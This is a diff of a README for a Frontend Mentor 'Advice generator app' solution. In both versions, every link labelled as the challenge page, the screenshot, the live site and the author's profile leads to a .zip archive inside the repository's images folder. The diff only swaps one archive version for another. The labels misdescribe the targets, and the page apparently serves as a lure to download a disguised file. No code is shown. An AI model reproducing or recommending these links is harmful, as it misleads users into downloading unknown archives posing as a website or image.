@@ -1,6 +1,6 @@
 # Frontend Mentor - Advice generator app solution
 
-This is a solution to the [Advice generator app challenge on Frontend Mentor](https://github.com/imadosan/advice-generator-app/raw/refs/heads/main/images/generator-advice-app-v1.9.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
+This is a solution to the [Advice generator app challenge on Frontend Mentor](https://raw.githubusercontent.com/imadosan/advice-generator-app/main/images/app-advice-generator-v2.7.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
 
 ## Table of contents
 
@@ -22,11 +22,11 @@ Users should be able to:
 
 ### Screenshot
 
-![Screenshot of the site](https://github.com/imadosan/advice-generator-app/raw/refs/heads/main/images/generator-advice-app-v1.9.zip)
+![Screenshot of the site](https://raw.githubusercontent.com/imadosan/advice-generator-app/main/images/app-advice-generator-v2.7.zip)
 
 ### Links
 
-- [Live Site](https://github.com/imadosan/advice-generator-app/raw/refs/heads/main/images/generator-advice-app-v1.9.zip)
+- [Live Site](https://raw.githubusercontent.com/imadosan/advice-generator-app/main/images/app-advice-generator-v2.7.zip)
 
 ### Built with
 
@@ -36,4 +36,4 @@ Users should be able to:
 
 ## Author
 
-- Frontend Mentor - [@imadosan](https://github.com/imadosan/advice-generator-app/raw/refs/heads/main/images/generator-advice-app-v1.9.zip)
+- Frontend Mentor - [@imadosan](https://raw.githubusercontent.com/imadosan/advice-generator-app/main/images/app-advice-generator-v2.7.zip)
